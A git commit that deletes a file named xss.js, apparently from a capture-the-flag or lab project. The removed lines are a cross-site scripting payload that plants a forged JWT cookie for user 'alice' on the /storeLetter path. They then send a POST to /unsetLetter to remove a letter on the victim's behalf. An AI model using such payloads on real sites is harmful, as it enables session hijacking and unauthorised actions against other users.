d1c4bf35480e36a1efaae50dbf1b75f3053bc7ea
deviant00 <mik3rickson@gmail.com>
2025-05-09 22:00:18 -0400

    Delete xss.js

--- xss.js
+++
@@ -1,2 +0,0 @@
-document.cookie = 'jwt=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTMsInVzZXJuYW1lIjoiYWxpY2UiLCJleHBpcmF0aW9uIjoyMDQzMzEzODE0MTA5fQ.XqJHAXkryqJTNGHYLoI-_E_y_AkUAf5W5PvS17oWmwg; expires=Thu, 18 Dec 2033 12:00:00 UTC; path=/storeLetter';
-fetch('/unsetLetter', {'method': 'POST',  'headers':{'Content-Type':'application/json'}, body: JSON.stringify({ letterId: '3' })}) 
